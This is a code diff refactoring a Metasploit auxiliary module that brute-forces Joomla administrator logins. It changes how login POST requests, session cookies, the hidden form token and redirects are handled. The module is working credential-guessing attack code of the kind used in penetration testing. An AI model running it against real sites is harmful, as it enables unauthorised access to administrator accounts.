@@ -38,8 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FORM_URI', [ false, "The FORM URI to authenticate against" , "/administrator"]),
         OptString.new('USER_VARIABLE', [ false, "The name of the variable for the user field", "username"]),
         OptString.new('PASS_VARIABLE', [ false, "The name of the variable for the password field" , "passwd"]),
-        OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"]),
-        OptString.new('UserAgent', [ true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0' ]),
+        OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"])
       ], self.class)
 
     register_autofilter_ports([80, 443])
@@ -88,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    vprint_error("#{rhost}:#{rport} - Searching Joomla authentication URI...")
+    vprint_status("#{rhost}:#{rport} - Searching Joomla authentication URI...")
     @uri = find_auth_uri
 
     if !@uri
@@ -126,7 +125,6 @@ class Metasploit3 < Msf::Auxiliary
       pass_var = datastore['PASS_VARIABLE']
 
       referer_var = "http://#{rhost}/administrator/index.php"
-      ctype = 'application/x-www-form-urlencoded'
 
       uid, cval, hidden_value = get_login_cookie
 
@@ -136,45 +134,43 @@ class Metasploit3 < Msf::Auxiliary
 
         uid.each do |val_uid|
           value_cookie = value_cookie + "#{val_uid.strip}=#{cval[index_cookie].strip};"
-          index_cookie = index_cookie +1
+          index_cookie = index_cookie + 1
         end
 
         value_cookie = value_cookie
-        vprint_status("Target #{target_url},Value of cookie ( #{value_cookie} ), Hidden ( #{hidden_value}=1 )")
-
-        data  = "#{user_var}=#{user}&" \
-                "#{pass_var}=#{pass}&" \
-                "lang=&" \
-                "option=com_login&" \
-                "task=login&" \
-                "return=aW5kZXgucGhw&" \
-                "#{hidden_value}=1"
-
+        vprint_status("#{target_url} - Login with cookie ( #{value_cookie} ) and Hidden ( #{hidden_value}=1 )")
         response = send_request_cgi({
-          'uri' => @uri,
-          'method' => datastore['REQUEST_TYPE'],
-          'cookie' => "#{value_cookie}",
-          'data' => data,
+          'uri'     => @uri,
+          'method'  => 'POST',
+          'cookie'  => "#{value_cookie}",
           'headers' =>
             {
-              'Content-Type'    => ctype,
-              'Referer' => referer_var,
-              'User-Agent' => datastore['UserAgent'],
-            }
+              'Referer'       => referer_var
+            },
+          'vars_post' => {
+            user_var     => user,
+            pass_var     => pass,
+            'lang'       => '',
+            'option'     => 'com_login',
+            'task'       => 'login',
+            'return'     => 'aW5kZXgucGhw',
+            hidden_value => 1
+          }
         })
 
-        vprint_status("#{target_url} -> First Response Code : #{response.code}")
+        if response
+          vprint_status("#{target_url} - Login Response #{response.code}")
 
-        if (response.code == 301 || response.code == 302 || response.code == 303) && response.headers['Location']
+          if response.redirect? && response.headers['Location']
+            path = response.headers['Location']
+            vprint_status("#{target_url} - Following redirect to #{path}...")
 
-          path = response.headers['Location']
-          print_status("Following redirect Response: #{path}")
-
-          response = send_request_raw({
-            'uri'     => path,
-            'method'  => 'GET',
-            'cookie' => "#{value_cookie}"
-          })
+            response = send_request_raw({
+              'uri'     => path,
+              'method'  => 'GET',
+              'cookie' => "#{value_cookie}"
+            })
+          end
         end
 
         return response
@@ -184,7 +180,7 @@ class Metasploit3 < Msf::Auxiliary
       end
       rescue ::Rex::ConnectionError
         vprint_error("#{target_url} - Failed to connect to the web server")
-      return nil
+        return nil
     end
   end
 
